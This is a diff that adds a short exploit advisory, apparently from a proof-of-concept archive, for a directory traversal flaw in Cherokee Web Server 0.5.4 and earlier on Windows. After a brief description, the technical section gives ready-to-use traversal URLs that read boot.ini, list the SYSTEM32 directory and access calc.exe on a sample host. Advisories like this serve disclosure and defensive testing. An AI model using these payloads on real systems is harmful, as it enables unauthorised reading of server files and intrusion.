@@ -1,0 +1,27 @@
+############################################################
+#
+# Cherokee Web Server <= 0.5.4 Directory Traversal Exploit
+# Found By:	Dr_IDE
+# Tested On:	Windows XPSP3
+# Download:	www.cherokee-project.com/download/windows
+#
+############################################################
+
+- Description -
+
+Cherokee Web Server <= 0.5.4 is a Windows based HTTP server. This is the latest
+version of the application available.
+
+Cherokee Web Server <= 0.5.4 is vulnerable to remote directory traversal attack by the
+following means. 
+
+Default webroot is C:\Program Files\Cherokee\www [3 levels deep] adjust accordingly.
+
+- Technical Details -
+http://[webserver IP]/[\../]
+
+http://172.16.2.101/\../\../\../boot.ini
+http://172.16.2.101/\../\../\../WINDOWS\SYSTEM32 		<- Full Directory Listings through Browser
+http://172.16.2.101/\../\../\../WINDOWS\SYSTEM32\calc.exe	<- File access in context of web browser instance
+
+#[pocoftheday.blogspot.com]
